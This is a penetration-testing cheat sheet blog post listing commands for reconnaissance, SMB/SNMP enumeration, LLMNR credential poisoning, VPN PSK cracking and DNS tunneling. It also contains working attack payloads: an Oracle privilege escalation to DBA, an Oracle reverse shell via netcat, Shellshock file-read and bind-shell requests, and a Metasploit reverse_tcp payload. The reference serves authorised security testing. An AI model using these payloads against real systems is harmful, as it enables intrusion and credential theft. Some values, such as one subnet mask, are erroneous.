---
layout: blog_item
title:  "Pen Testing Tools Cheat Sheet"
date:   2020-03-16 14:22:10
author: Arr0way
description: 'Penetration testing tools cheat sheet, a high level overview / quick reference cheat sheet for penetration testing.'
categories: [cheat-sheet]
tags:
- Windows
- SMB
- Linux
- Tools
- 'Penetration Testing'

---

## Introduction 

**Penetration testing tools cheat sheet**, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level overview of the **typical** commands used during a [penetration testing](https://www.aptive.co.uk/cybersecurity/what-is-pentesting/) engagement. For more in depth information I'd recommend the man file for the tool, or a more specific pen testing cheat sheet from the menu on the right.

The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few SQLMap commands at the end and some web server enumeration. For Web Application Penetration Testing, check out the Web Application Hackers Hand Book, it is excellent for both learning and reference.

If I'm missing any pen testing tools here give me a nudge on twitter. 

### Changelog

16/09/2020 - fixed some formatting issues.
17/02/2017 - Article updated, added loads more content, VPN, DNS tunneling, VLAN hopping etc - check out the TOC below. 


* list element with functor item
{:toc}


## Pre-engagement

### Network Configuration 

#### Set IP Address 


```
ifconfig eth0 xxx.xxx.xxx.xxx/24 
```

#### Subnetting 

```
ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
```

## OSINT

### Passive Information Gathering 

#### DNS 

##### WHOIS enumeration 

```
whois domain-name-here.com 
``` 

##### Perform DNS IP Lookup

``` 
dig a domain-name-here.com @nameserver 
``` 

##### Perform MX Record Lookup

``` 
dig mx domain-name-here.com @nameserver
``` 

##### Perform Zone Transfer with DIG 

``` 
dig axfr domain-name-here.com @nameserver
``` 

## DNS Zone Transfers

<div class="mobile-side-scroller">
<table>
   <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>nslookup -> set type=any -> ls -d blah.com</code></p>
      </td>
      <td>
           <p>Windows DNS zone transfer</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>dig axfr blah.com @ns1.blah.com</code></p>
      </td>
      <td>
            <p>Linux DNS zone transfer</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

#### Email 

##### Simply Email

Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn't think you're a robot and make you fill out a Captcha. 

```
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
``` 

Simply Email can verify the discovered email addresss after gathering. 


### Semi Active Information Gathering

#### Basic Finger Printing

Manual finger printing / banner grabbing.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>

    <tr>
      <td>
        <p><code>nc -v 192.168.1.1 25</code></p>
        <p><code>telnet 192.168.1.1 25</code></p>
      </td>
      <td>
            <p>Basic versioning / finger printing via displayed banner</p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### Banner grabbing with NC

```
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>
```

### Active Information Gathering 

#### DNS Bruteforce 

##### DNSRecon

<section class="shellbox">
    <div class="unit golden-large code">
      <p class="title">DNS Enumeration Kali - DNSRecon</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span>
        </p>
      </div>
    </div>
</section>

#### Port Scanning

##### Nmap Commands

For more commands, see the Nmap cheat sheet (link in the menu on the right).

Basic Nmap Commands: 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>
    <tr>
      <td>
        <p><code>nmap -v -sS -A -T4 target</code></p>
      </td>
      <td>
            <p>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>nmap -v -sS -p--A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports (takes a lot longer)</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>nmap -v -sU -sS -p- -A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports and UDP scan (takes even longer)</p>
      </td>
    <tr>
      <td>
        <p><code>nmap -v -p 445 --script=smb-check-vulns <br>--script-args=unsafe=1 192.168.1.X</code></p>
      </td>
      <td>
            <p>Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover</p>
      </td>
    </tr>
      <td>
        <p><code>ls /usr/share/nmap/scripts/* | grep ftp</code></p>
      </td>
      <td>
            <p>Search nmap scripts for keywords</p>
      </td>
    </tr>
  </tbody>
  </table>
  </div>


I've had a few people mention about T4 scans, apply common sense here. Don't use T4 commands on external pen tests (when using an Internet connection), you're probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.

###### Nmap UDP Scanning 

```
nmap -sU TARGET 
```

###### UDP Protocol Scanner

```
git clone https://github.com/portcullislabs/udp-proto-scanner.git
```
Scan a file of IP addresses for all services: 
```
./udp-protocol-scanner.pl -f ip.txt 
```

Scan for a specific UDP service:

```
udp-proto-scanner.pl -p ntp -f ips.txt
```

###### Other Host Discovery

Other methods of host discovery, that don't use nmap...

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
      <tbody>

    <tr>
      <td>
        <p><code>netdiscover -r 192.168.1.0/24</code></p>
      </td>
      <td>
            <p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site</p>
      </td>

    </tr>
  </tbody>
</table>
</div>


## Enumeration & Attacking Network Services 

Penetration testing tools that spefically identify and / or enumerate network services: 


### SAMB / SMB / Windows Domain Enumeration 

#### Samba Enumeration

##### SMB Enumeration Tools 

```
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

Also see, nbtscan cheat sheet (right hand menu).

  <div class="mobile-side-scroller">
  <table>
    <thead>
      <tr>
        <th>Command</th>
        <th>Description</th>
      </tr>
    </thead>
        <tbody>
        <tr>
        <td>
          <p><code>nbtscan 192.168.1.0/24</code></p>
        </td>
        <td><p>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</p></td>
      </tr>

       <tr>
        <td>
          <p><code>enum4linux -a target-ip</code></p>
        </td>
        <td>
              <p>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</p>
        </td>
      </tr>
    </tbody>
  </table>
  </div>

##### Fingerprint SMB Version

``` 
smbclient -L //192.168.1.100 
```

##### Find open SMB Shares

```
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
```

##### Enumerate SMB Users

```
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
```

```
python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
```

RID Cycling: 

```
ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
``` 

Metasploit module for RID cycling:

```
use auxiliary/scanner/smb/smb_lookupsid
```

##### Manual Null session testing:

Windows: 

```
net use \\TARGET\IPC$ "" /u:""
```

Linux:

```
smbclient -L //192.168.99.131
```


##### NBTScan unixwiz 

Install on Kali rolling: 
```
apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 > nbtscan
```

### LLMNR / NBT-NS Spoofing

Steal credentials off the network.

##### Metasploit LLMNR / NetBIOS requests

Spoof / poison LLMNR / NetBIOS requests: 

```
auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response
```

Capture the hashes: 

```
auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
```

You'll end up with NTLMv2 hash, use john or hashcat to crack it. 

#### Responder.py

Alternatively you can use responder. 

```
git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
```


<div class="note tip">
  <h5>Run Responder.py for the whole engagement</h5>
  <p>Run Responder.py for the length of the engagement while you're working on other attack vectors.</p>
</div>

### SNMP Enumeration Tools

A number of SNMP enumeration tools.

Fix SNMP output values so they are human readable: 

```
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
```

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>snmpcheck -t 192.168.1.X -c public</code></p>
        <p><code>snmpwalk -c public -v1 192.168.1.X 1| <br> grep hrSWRunName|cut -d* * -f </code></p>
        <p><code>snmpenum -t 192.168.1.X</code></p>
        <p><code>onesixtyone -c names -i hosts</code></p>  
      </td>
      <td>SNMP enumeration</td>
    </tr>
  </tbody>
</table>
</div>

#### SNMPv3 Enumeration Tools

Idenitfy SNMPv3 servers with nmap: 

```
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
```

Rory McCune's snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:

```
apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
```


<div class="note tip">
  <h5>Use Metasploits Wordlist</h5>
  <p>Metasploit's wordlist (KALI path below) has common credentials for v1 & 2 of SNMP, for newer credentials check out Daniel Miessler's SecLists project on GitHub (not the mailing list!).</p>
</div>

```
/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
```

### R Services Enumeration

This is legacy, included for completeness. 

nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation: 

#### RSH Enumeration
##### RSH Run Commands
```
rsh <target> <command>
```
##### Metasploit RSH Login Scanner
```
auxiliary/scanner/rservices/rsh_login
```

##### rusers Show Logged in Users  
```
rusers -al 192.168.2.1
```

##### rusers scan whole Subnet

``` 
rlogin -l <user> <target>
```

e.g rlogin -l root TARGET-SUBNET/24

### Finger Enumeration

```
finger @TARGET-IP
```

#### Finger a Specific Username 

```
finger batman@TARGET-IP 
```

#### Solaris bug that shows all logged in users:

``` 
finger 0@host  

SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost 
```


### rwho 

Use nmap to identify machines running rwhod (513 UDP)


## TLS & SSL Testing

### testssl.sh 

Test all the things on a single host and output to a .html file:

```
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html  
```

## Vulnerability Assessment 

Install OpenVAS 8 on Kali Rolling: 

```
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup
```

Verify openvas is running using: 

```
netstat -tulpn
``` 

Login at https://127.0.0.1:9392 - credentials are generated during openvas-setup. 

## Database Penetration Testing 

Attacking database servers exposed on the network.

### Oracle 

Install oscanner: 
```
apt-get install oscanner  
```
Run oscanner:

```
oscanner -s 192.168.1.200 -P 1521 
```

#### Fingerprint Oracle TNS Version

Install tnscmd10g:
```
apt-get install tnscmd10g
```

Fingerprint oracle tns: 

```
tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 
``` 

#### Brute force oracle user accounts

Identify default Oracle accounts: 

```
 nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute 
```

Run nmap scripts against Oracle TNS:

```
nmap -p 1521 -A TARGET
``` 


#### Oracle Privilege Escalation 

Requirements: 

- Oracle needs to be exposed on the network 
- A default account is in use like scott 

Quick overview of how this works: 

1. Create the function  
1. Create an index on table SYS.DUAL
2. The index we just created executes our function SCOTT.DBA_X 
3. The function will be executed by SYS user (as that's the user that owns the table).
4. Create an account with DBA priveleges 

In the example below the user SCOTT is used but this should be possible with another default Oracle account. 

##### Identify default accounts within oracle db using NMAP NSE scripts: 

```
nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 
```
Login using the identified weak account (assuming you find one).

##### How to identify the current privilege level for an oracle user: 


```
SQL> select * from session_privs; 

SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;
```


##### Oracle priv esc and obtain DBA access: 

Run netcat: <code>netcat -nvlp 443</code>code> 


```
SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
```

##### Run the exploit with a select query: 

```
SQL> Select * from session_privs; 
```

You should have a DBA user with creds user1 and pass1. 

Verify you have DBA privileges by re-running the first command again. 

##### Remove the exploit using: 
```
drop index exploit_1337; 
```

##### Get Oracle Reverse os-shell:

```
begin
dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
    'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
    SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
``` 


### MSSQL 

Enumeration / Discovery:

Nmap:

```
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
```


Metasploit: 

```
msf > use auxiliary/scanner/mssql/mssql_ping
```

<div class="note tip">
  <h5>Use MS SQL Servers Browse For More</h5>
  <p>Try using "Browse for More" via MS SQL Server Management Studio</p>
</div>

#### Bruteforce MSSQL Login

```
msf > use auxiliary/admin/mssql/mssql_enum
```

#### Metasploit MSSQL Shell 

```
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```


## Network 

### Plink.exe Tunnel 

PuTTY Link tunnel

Forward remote port to local address:

```
plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
```

### Pivoting 

#### SSH Pivoting 

```
ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
```

Add socks4 127.0.0.1 1010 in /etc/proxychains.conf


SSH pivoting from one network to another: 

```
ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
```

Add socks4 127.0.0.1 1010 in /etc/proxychains.conf

```
proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
```

Add socks4 127.0.0.1 1011 in /etc/proxychains.conf


#### Meterpreter Pivoting 

### TTL Finger Printing

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Operating System</th>
      <th>TTL Size</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Windows</p>
      </td>
      <td>
            <p><code>128</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>Linux</p>
      </td>
      <td>
            <p><code>64</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>Solaris</p>
      </td>
      <td>
            <p><code>255</code></p>
      </td>
    </tr>
     <tr>
      <td>
        <p>Cisco / Network</p>
      </td>
      <td>
        <p><code>255</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### IPv4 Cheat Sheets

#### Classful IP Ranges

E.g Class A,B,C (depreciated)

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Class</th>
      <th>IP Address Range</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Class A IP Address Range</p>
      </td>
      <td>
        <p><code>0.0.0.0 - 127.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class B IP Address Range</p>
      </td>
      <td>
        <p><code>128.0.0.0 - 191.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class C IP Address Range</p>
      </td>
      <td>
        <p><code>192.0.0.0 - 223.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class D IP Address Range</p>
      </td>
      <td>
        <p><code>224.0.0.0 - 239.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class E IP Address Range</p>
      </td>
      <td>
        <p><code>240.0.0.0 - 255.255.255.255</code></p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### IPv4 Private Address Ranges


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Class</th>
      <th>Range</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>Class A Private Address Range</p>
      </td>
      <td>
        <p><code>10.0.0.0 - 10.255.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class B Private Address Range</p>
      </td>
      <td>
        <p><code>172.16.0.0 - 172.31.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p>Class C Private Address Range</p>
      </td>
      <td>
        <p><code>192.168.0.0 - 192.168.255.255</code></p>
      </td>
    </tr>
    <tr>  
      <td>
        <p></p>
      </td>
      <td>
        <p><code>127.0.0.0 - 127.255.255.255</code></p>
      </td>
    </tr>
  </tbody>
</table>
</div>

#### IPv4 Subnet Cheat Sheet  

Subnet cheat sheet, not really realted to pen testing but a useful reference. 

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>CIDR</th>
      <th>Decimal Mask</th>
      <th>Number of Hosts</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p>/31</p>
      </td>
      <td>
        <p><code>255.255.255.254</code></p>
      </td>
      <td>
        <p><code>1 Host</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/30</p>
      </td>
      <td>
        <p><code>255.255.255.252</code></p>
      </td>
      <td>
        <p><code>2 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/29</p>
      </td>
      <td>
        <p><code>255.255.255.249</code></p>
      </td>
      <td>
        <p><code>6 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/28</p>
      </td>
      <td>
        <p><code>255.255.255.240</code></p>
      </td>
      <td>
        <p><code>14 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/27</p>
      </td>
      <td>
        <p><code>255.255.255.224</code></p>
      </td>
      <td>
        <p><code>30 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/26</p>
      </td>
      <td>
        <p><code>255.255.255.192</code></p>
      </td>
      <td>
        <p><code>62 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/25</p>
      </td>
      <td>
        <p><code>255.255.255.128</code></p>
      </td>
      <td>
        <p><code>126 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/24</p>
      </td>
      <td>
        <p><code>255.255.255.0</code></p>
      </td>
      <td>
        <p><code>254 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/23</p>
      </td>
      <td>
        <p><code>255.255.254.0</code></p>
      </td>
      <td>
        <p><code>512 Host</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/22</p>
      </td>
      <td>
        <p><code>255.255.252.0</code></p>
      </td>
      <td>
        <p><code>1022 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/21</p>
      </td>
      <td>
        <p><code>255.255.248.0</code></p>
      </td>
      <td>
        <p><code>2046 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/20</p>
      </td>
      <td>
        <p><code>255.255.240.0</code></p>
      </td>
      <td>
        <p><code>4094 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/19</p>
      </td>
      <td>
        <p><code>255.255.224.0</code></p>
      </td>
      <td>
        <p><code>8190 Hosts</code></p>
      </td>
    </tr>


    <tr>
      <td>
        <p>/18</p>
      </td>
      <td>
        <p><code>255.255.192.0</code></p>
      </td>
      <td>
        <p><code>16382 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/17</p>
      </td>
      <td>
        <p><code>255.255.128.0</code></p>
      </td>
      <td>
        <p><code>32766 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/16</p>
      </td>
      <td>
        <p><code>255.255.0.0</code></p>
      </td>
      <td>
        <p><code>65534 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/15</p>
      </td>
      <td>
        <p><code>255.254.0.0</code></p>
      </td>
      <td>
        <p><code>131070 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/14</p>
      </td>
      <td>
        <p><code>255.252.0.0</code></p>
      </td>
      <td>
        <p><code>262142 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/13</p>
      </td>
      <td>
        <p><code>255.248.0.0</code></p>
      </td>
      <td>
        <p><code>524286 Hosts</code></p>
      </td>
    </tr>


    <tr>
      <td>
        <p>/12</p>
      </td>
      <td>
        <p><code>255.240.0.0</code></p>
      </td>
      <td>
        <p><code>1048674 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/11</p>
      </td>
      <td>
        <p><code>255.224.0.0</code></p>
      </td>
      <td>
        <p><code>2097150 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/10</p>
      </td>
      <td>
        <p><code>255.192.0.0</code></p>
      </td>
      <td>
        <p><code>4194302 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/9</p>
      </td>
      <td>
        <p><code>255.128.0.0</code></p>
      </td>
      <td>
        <p><code>8388606 Hosts</code></p>
      </td>
    </tr>

    <tr>
      <td>
        <p>/8</p>
      </td>
      <td>
        <p><code>255.0.0.0</code></p>
      </td>
      <td>
        <p><code>16777214 Hosts</code></p>
      </td>
    </tr>

  </tbody>
</table>
</div>


### VLAN Hopping 

Using NCCGroups VLAN wrapper script for Yersina simplifies the process. 

```
git clone https://github.com/nccgroup/vlan-hopping.git
chmod 700 frogger.sh
./frogger.sh 
```

### VPN Pentesting Tools 

Identify VPN servers: 

```
./udp-protocol-scanner.pl -p ike TARGET(s)

```

Scan a range for VPN servers: 

```
./udp-protocol-scanner.pl -p ike -f ip.txt
```

#### IKEForce 

Use IKEForce to enumerate or dictionary attack VPN servers.

Install:
```
pip install pyip
git clone https://github.com/SpiderLabs/ikeforce.git
```
Perform IKE VPN enumeration with IKEForce: 
```
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```
Bruteforce IKE VPN using IKEForce: 

```
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
```


```
ike-scan
ike-scan TARGET-IP
ike-scan -A TARGET-IP
ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key
```

#### IKE Aggressive Mode PSK Cracking

1. Identify VPN Servers 
2. Enumerate with IKEForce to obtain the group ID
3. Use ike-scan to capture the PSK hash from the IKE endpoint 
4. Use psk-crack to crack the hash 

##### Step 1: Idenitfy IKE Servers

```
./udp-protocol-scanner.pl -p ike SUBNET/24
```

##### Step 2: Enumerate group name with IKEForce

```
./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
```

##### Step 3: Use ike-scan to capture the PSK hash

```
ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
```

##### Step 4: Use psk-crack to crack the PSK hash 

```
psk-crack hash-file.txt
```

Some more advanced psk-crack options below: 

```
pskcrack
psk-crack -b 5 TARGET-IPkey
psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
psk-crack -d /path/to/dictionary-file TARGET-IP-key
```

#### PPTP Hacking

Identifying PPTP, it listens on TCP: 1723

##### NMAP PPTP Fingerprint:

```
nmap –Pn -sV -p 1723 TARGET(S)
```

##### PPTP Dictionary Attack

```
thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst
```


### DNS Tunneling 

Tunneling data over DNS to bypass firewalls.

dnscat2 supports "download" and "upload" commands for getting files (data and programs) to and from the target machine.

#### Attacking Machine 

Installtion:
```
apt-get update
apt-get -y install ruby-dev git make g++
gem install bundler
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle install
```

Run dnscat2: 

```
ruby ./dnscat2.rb
dnscat2> New session established: 1422
dnscat2> session -i 1422
```

Target Machine: 

https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell/

```
dnscat --host <dnscat server_ip>
```
## BOF / Exploit

## Exploit Research

Find exploits for enumerated hosts / services.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>searchsploit windows 2003 | grep -i local</code></p>
      </td>
      <td>
            <p>Search exploit-db for exploit, in this example windows 2003 + local esc</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>site:exploit-db.com exploit kernel <= 3</code></p>
      </td>
      <td>
            <p>Use google to search exploit-db.com for exploits</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>grep -R "W7" /usr/share/metasploit-framework<br>/modules/exploit/windows/*</code></p>
      </td>
      <td>
            <p>Search metasploit modules using grep - msf search sucks a bit</p>
      </td>
    </tr>

  </tbody>
</table>
</div>

### Searching for Exploits 

Install local copy of exploit-db: 

```
 searchsploit –u
 searchsploit apache 2.2
 searchsploit "Linux Kernel"
 searchsploit linux 2.6 | grep -i ubuntu | grep local
```

### Compiling Windows Exploits on Kali 

```
  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
  wine mingw-get-setup.exe
  select mingw32-base
  cd /root/.wine/drive_c/windows
  wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
  cd /root/.wine/drive_c/MinGW/bin
  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
  wine ability.exe  
``` 

### Cross Compiling Exploits

```
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
```


### Exploiting Common Vulnerabilities 

#### Exploiting Shellshock 

A tool to find and exploit servers vulnerable to Shellshock:

```
git clone https://github.com/nccgroup/shocker
```

```
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
```

##### cat file (view file contents)

```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

##### Shell Shock run bind shell
```
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
```

##### Shell Shock reverse Shell
```
nc -l -p 443
```



## Simple Local Web Servers

Python local web server command, handy for serving up shells and exploits on an attacking machine.

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>

    <tr>
      <td>
        <p><code>python -m SimpleHTTPServer 80</code></p>
      </td>
      <td>
            <p>Run a basic http server, great for serving up shells etc</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>python3 -m http.server</code></p>
      </td>
      <td>
            <p>Run a basic Python3 http server, great for serving up shells etc</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>ruby -rwebrick -e "WEBrick::HTTPServer.new<br>(:Port => 80, :DocumentRoot => Dir.pwd).start"</code></p>
      </td>
      <td>
            <p>Run a ruby webrick basic http server</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>php -S 0.0.0.0:80</code></p>
      </td>
      <td>
            <p>Run a basic PHP http server</p>
      </td>
    </tr>
  </tbody>
</table>
</div>



## Mounting File Shares

How to mount NFS / CIFS, Windows and Linux file shares.


<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
   <tbody>
     <tr>
      <td>
        <p><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></p>
      </td>
      <td>
           <p>Mount NFS share to <code>/mnt/nfs</code> </p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>mount -t cifs -o username=user,password=pass<br>,domain=blah //192.168.1.X/share-name /mnt/cifs</code></p>
      </td>
      <td>
           <p>Mount Windows CIFS / SMB share on Linux at <code>/mnt/cifs</code> if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)</p>
      </td>
    </tr>
    <tr>
      <td>
          <p><code>net use Z: \\win-server\share password <br> /user:domain\janedoe /savecred /p:no</code></p>
      </td>
      <td>
           <p>Mount a Windows share on Windows from the command line</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>apt-get install smb4k -y</code></p>
      </td>
      <td>
           <p>Install smb4k on Kali, useful Linux GUI for browsing SMB shares</p>
      </td>
    </tr>

  </tbody>
</table>
</div>








## HTTP / HTTPS Webserver Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>

    <tr>
      <td>
        <p><code>nikto -h 192.168.1.1</code></p>
      </td>
      <td>
            <p>Perform a nikto scan against target</p>
      </td>
    </tr>

    <tr>
      <td>
        <p><code>dirbuster</code></p>
      </td>
      <td>
            <p>Configure via GUI, CLI input doesn't work most of the time</p>
      </td>
   </tr>
  </tbody>
</table>
</div>

## Packet Inspection

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <p><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></p>
      </td>
